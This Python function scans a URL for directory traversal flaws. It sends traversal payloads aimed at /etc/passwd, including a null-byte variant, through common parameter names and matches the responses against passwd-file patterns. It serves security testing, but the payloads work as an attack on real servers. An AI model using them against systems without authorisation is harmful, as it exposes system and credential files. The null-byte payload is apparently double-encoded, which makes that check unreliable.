import requests
import re
import urllib.parse
import time

def test_directory_traversal(url):
    """
    Tests for directory traversal vulnerabilities by trying various payloads
    on common parameters and checking responses for file content signatures.
    """
    results = []
    # Common parameters that might be vulnerable to directory traversal
    parameters = [
        "file", "document", "folder", "path", "style", "template", 
        "filepath", "directory", "load", "doc", "page", "filename", 
        "download", "view", "include", "require", "read"
    ]
    
    # Common directory traversal payloads
    payloads = [
        "../../../../etc/passwd",  # Standard path traversal
        "../../../etc/passwd",     # Fewer levels
        "../../etc/passwd",        # Even fewer levels
        "../../../../etc/passwd%00"  # Null byte injection for bypassing extensions
    ]
    
    # Patterns that indicate a successful directory traversal
    passwd_patterns = [
        r"root:.*:0:0:",
        r"bin:.*:/bin",
        r"daemon:.*:/usr/sbin",
        r"nobody:.*/nonexistent"
    ]
    
    # Track which parameters we've already found to be vulnerable
    vulnerable_params = set()
    
    # Test each parameter with each payload
    for param in parameters:
        # Skip if we already found this parameter to be vulnerable
        if param in vulnerable_params:
            continue
            
        for payload in payloads:
            encoded_payload = urllib.parse.quote(payload)
            test_url = f"{url}?{param}={encoded_payload}"
            
            try:
                response = requests.get(test_url, timeout=10)
                response_text = response.text
                
                # Check if response contains any of the passwd file patterns
                is_vulnerable = False
                for pattern in passwd_patterns:
                    if re.search(pattern, response_text):
                        is_vulnerable = True
                        break
                
                # If pattern is found, mark as vulnerable
                if is_vulnerable:
                    results.append({
                        "issue": f"Directory Traversal vulnerability detected via parameter '{param}' with payload: {payload}",
                        "severity": "High"
                    })
                    vulnerable_params.add(param)
                    break  # No need to try more payloads for this parameter
                    
            except requests.exceptions.RequestException:
                continue  # Skip to next payload if request fails

    # Test for null byte injection separately (might reveal different vulnerabilities)
    for param in parameters:
        if param in vulnerable_params:
            continue
            
        null_payload = "../../../../etc/passwd%00"
        encoded_null_payload = urllib.parse.quote(null_payload)
        test_url = f"{url}?{param}={encoded_null_payload}"
        
        try:
            response = requests.get(test_url, timeout=10)
            for pattern in passwd_patterns:
                if re.search(pattern, response.text):
                    results.append({
                        "issue": f"Null byte injection Directory Traversal vulnerability detected via parameter '{param}' with payload: {null_payload}",
                        "severity": "High"
                    })
                    vulnerable_params.add(param)
                    break
        except requests.exceptions.RequestException:
            continue

    # If no vulnerabilities found, report that
    if not results:
        results.append({
            "issue": "No directory traversal vulnerabilities detected.",
            "severity": "Low"
        })
    
    return results